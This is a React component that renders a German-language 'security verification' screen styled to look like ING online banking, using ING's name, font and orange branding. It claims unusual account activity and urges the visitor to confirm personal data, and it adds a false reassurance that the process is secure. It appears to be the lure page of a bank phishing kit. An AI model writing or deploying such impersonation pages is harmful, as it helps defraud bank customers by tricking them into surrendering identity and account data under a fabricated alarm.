import React from 'react';
import { AlertTriangle } from 'lucide-react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        minHeight: '80vh',
        display: 'flex',
        alignItems: 'flex-start',
        paddingTop: '4rem'
      }}>
        <div style={{
          maxWidth: '1440px',
          margin: '0 auto',
          width: '100%',
          padding: '0 2rem'
        }}>
          {/* Warning Box */}
          <div style={{
            backgroundColor: '#fff3cd',
            border: '1px solid #ffeaa7',
            borderRadius: '8px',
            padding: '20px',
            marginBottom: '3rem',
            display: 'flex',
            alignItems: 'flex-start',
            gap: '16px',
            maxWidth: '800px'
          }}>
            <AlertTriangle size={24} color="#856404" style={{ flexShrink: 0, marginTop: '2px' }} />
            <div>
              <h2 style={{
                color: '#856404',
                fontSize: '1.25rem',
                fontWeight: '600',
                marginBottom: '0.5rem',
                fontFamily: 'ING Me, Arial, sans-serif'
              }}>
                Sicherheitsüberprüfung erforderlich
              </h2>
              <p style={{
                color: '#856404',
                fontSize: '1rem',
                margin: 0,
                fontFamily: 'ING Me, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                Aus Sicherheitsgründen müssen Sie Ihre Identität verifizieren. Bitte bestätigen Sie Ihre persönlichen Daten, um fortzufahren.
              </p>
            </div>
          </div>

          {/* Main Content */}
          <div style={{ maxWidth: '800px' }}>
            {/* Large Title */}
            <h1 className="mobile-title" style={{
              color: '#333',
              fontSize: '3rem',
              fontWeight: '600',
              marginBottom: '1.5rem',
              fontFamily: 'ING Me, Arial, sans-serif',
              lineHeight: '1.1'
            }}>
              Sicherheitsüberprüfung
            </h1>
            
            {/* Information Text */}
            <div style={{ marginBottom: '3rem' }}>
              <p style={{
                color: '#666',
                fontSize: '1.125rem',
                lineHeight: '1.6',
                marginBottom: '1.5rem',
                fontFamily: 'ING Me, Arial, sans-serif'
              }}>
                Ihre Sicherheit ist uns wichtig. Wir haben ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt und müssen Ihre Identität verifizieren.
              </p>
              
              <p style={{
                color: '#666',
                fontSize: '1.125rem',
                lineHeight: '1.6',
                marginBottom: '1.5rem',
                fontFamily: 'ING Me, Arial, sans-serif'
              }}>
                Bitte bestätigen Sie Ihre persönlichen Daten, um den Schutz Ihres Kontos zu gewährleisten.
              </p>
            </div>
            
            {/* Primary Button */}
            <button
              onClick={onStartVerification}
              style={{
                backgroundColor: '#ff6200',
                color: 'white',
                border: 'none',
                borderRadius: '8px',
                padding: '16px 32px',
                fontSize: '16px',
                fontWeight: '600',
                cursor: 'pointer',
                fontFamily: 'ING Me, Arial, sans-serif',
                transition: 'all 0.3s ease',
                display: 'inline-flex',
                alignItems: 'center',
                gap: '8px',
                boxShadow: '2px 2px 4px rgba(0, 0, 0, 0.15)'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.backgroundColor = '#e55800';
                e.currentTarget.style.transform = 'translateY(-1px)';
                e.currentTarget.style.boxShadow = '3px 3px 6px rgba(0, 0, 0, 0.2)';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.backgroundColor = '#ff6200';
                e.currentTarget.style.transform = 'translateY(0)';
                e.currentTarget.style.boxShadow = '2px 2px 4px rgba(0, 0, 0, 0.15)';
              }}
            >
              Identität jetzt verifizieren
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            </button>

            {/* Security Note */}
            <div style={{
              marginTop: '3rem',
              padding: '1.5rem',
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              borderLeft: '4px solid #ff6200'
            }}>
              <p style={{
                color: '#444',
                fontSize: '0.875rem',
                margin: 0,
                fontFamily: 'ING Me, Arial, sans-serif',
                lineHeight: '1.5'
              }}>
                <strong>Sicherheitshinweis:</strong> ING wird Sie niemals per E-Mail oder Telefon nach Ihren vollständigen Zugangsdaten fragen. Diese Verifizierung erfolgt ausschließlich über unser gesichertes Online-Banking-Portal.
              </p>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default AccountCompromisedScreen;
